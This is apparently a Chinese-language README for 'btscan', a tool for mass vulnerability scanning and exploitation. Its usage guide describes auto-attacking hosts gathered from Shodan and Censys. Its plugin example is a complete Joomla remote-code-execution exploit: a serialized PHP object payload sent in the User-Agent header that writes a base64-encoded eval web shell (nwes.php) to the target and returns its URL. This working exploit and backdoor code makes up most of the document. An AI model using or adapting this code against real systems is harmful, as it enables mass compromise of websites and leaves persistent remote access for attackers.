#批量漏洞扫描和批量漏洞利用框架btscan

##目录结构

    --lib 核心文件库

    --report 报告生成的文件夹

    --node 里面每一个py文件是一个攻击向量，添加扫描节点也是向里面添加文件

    --crawl 通过空间搜索引擎抓取url或者ip的脚本

##使用方法
    python btScan.py
    usage: btScan.py [options]
    
    * batch vulnerability verification and exploition framework. *
    By he1m4n6a
    
    optional arguments:
      -h, --help   show this help message and exit
      -t THREADS   Num of scan threads for each scan process, 20 by default
      -m MODE      select mode [config|script]
                   e.g. -m script
      -n NAME      from node floder choose a script
      -c COMMAND   give an instruction when use script mode [verify|exploit]
                   e.g. -c verify
      -u URL_FILE  input url file
      -i IP_FILE   input ip file
      -autoIP      get ip from space search engine and auto attack
      -autoURL     get url from space search engine and auto attack
      -v           show program's version number and exit
脚本存在两种验证模式，一种是通过加载模块，另一种是通过配置文件。复杂的可以通过加载脚本，简单的通过加载配置文件即可。然后攻击也有两种模式，验证verify模式和攻击exploit模式。 你也可以指定ip或者url作为输入格式，也可以自动获取ip或者url，那就是配合crawl文件下的网络空间抓取模块。

**示例**
```
    python btscan.py -n joomla -m script -c verify -u url.txt
-n 指定node文件夹下的joomla.py，-m指定为script模式，即指定加载模块的模式。-c指定模式为验证，仅为验证就好了，-u指定输入为url的模式。
```
```
python btscan.py -n joomla -m script -c exploit -u url.txt
同上，只是指定为攻击模式。
```
```
python btscan.py  -m config -c verify -i ip.txts
-m指定为config模式，-c指定为验证模式，-i指定输入的为ip模式，仅需通过conf目录下的scan_rule.ini的配置就够了。
```

##插件编写规则

仅需要在node文件夹下新增一个py文件

py文件中重要的有两个函数verify和exploit函数，没有exploit攻击模式，仅需要verify函数，返回值有三个值，第一个值是返回是否存在漏洞，返回True或者False；第二个值是返回url，第三个值返回需要打印的信息。

***示例(joomla.py为例)***

```
#!/usr/bin/env python
#coding=utf8

import urllib2
import urllib
import re
import cookielib, sys
import requests

def checkJoomlaRCE(url):
    poc = generate_payload("phpinfo();")
    try:
        result = get_url(url, poc)
        if 'phpinfo()' in result:
            system = getInfoByJoomlaRCE(result, 'System')
            document_root = getInfoByJoomlaRCE(result, 'DOCUMENT_ROOT')
            if document_root == 'no info!':
                msg = 'vul, but get shell failed!'
                return False, url,  msg
            script_filename = getInfoByJoomlaRCE(result, 'SCRIPT_FILENAME')
            if script_filename == 'no info!':
                msg = 'vul, but get shell failed!'
                return False, url, msg
            shell_file = getShellByJoomlaRCE(url, system, script_filename)
            if shell_file == 'no info!':
                msg = 'vul, but get shell failed!'
                return False, url, msg
            msg = 'get shell succsss, shell:  %s' %shell_file
            return True, url, msg
        else:
            msg = 'safe'
            return False, url, msg
            # print '[!] no vuls! url: '+url
    except Exception,e:
        msg = str(e)
        return False, url, msg

def getShellByJoomlaRCE(url, system, script_filename):
    if 'no info' not in script_filename and 'no info' not in system:
        if 'Windows' in system:
            shell = script_filename.split('index.php')[0].replace('/','//').strip()+"nwes.php"
        else:
            shell = script_filename.split('index.php')[0]+"nwes.php"
        cmd ="file_put_contents('"+shell+"',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+'));"
        pl = generate_payload(cmd)
        try:
            get_url(url, pl)
            return url+"nwes.php"
        except Exception, e:
            return "no info!"
    else:
        return "no info!"
  
def getInfoByJoomlaRCE(result, param):
    if "System" in param:
        reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "DOCUMENT_ROOT" in param:
        reg = '.*<tr><td class="e">DOCUMENT_ROOT </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "SCRIPT_FILENAME" in param:
        reg = '.*<tr><td class="e">SCRIPT_FILENAME </td><td class="v">([^<>]*?)</td></tr>.*'
    match_url = re.search(reg,result)
    if match_url:
       info = match_url.group(1)
    else:
        info = 'no info!'
    return info

def get_url(url, user_agent): 
    headers = {
    'User-Agent': user_agent
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(2):
        response = requests.get(url, headers=headers, cookies=cookies)
    return response.content
    
def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
    return encoded[:-1]
  
def generate_payload(php_payload): 
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
  
    return exploit_template
  

#verify vulnerable 
def verify(url):
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    urllib2.install_opener(opener)
    urllib2.socket.setdefaulttimeout(10)

    ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
    req = urllib2.Request(url=url, headers={'User-Agent': ua})
    opener.open(req)
    req = urllib2.Request(url=url)
    res = opener.open(req).read()
    if '_SERVER["DOCUMENT_ROOT"]' in res:
        msg = 'vul'
        return True, url, msg
    else:
        msg = 'safe'
        return False, url, msg

#exploit vulnerable
def exploit(url):
    res = checkJoomlaRCE(url)
    return res
```
上面函数都可以自己定义，主要是verfiy和exploit函数，如果exploit函数和verify函数一样，exploit函数里面只要简单的self.verify(url)即可。

##其他

crwal文件夹的NetSearch.py里面的shadon和censys模块的密钥要自己填上。

有任何交流和问题可以联系我he1m4n6a@163.com
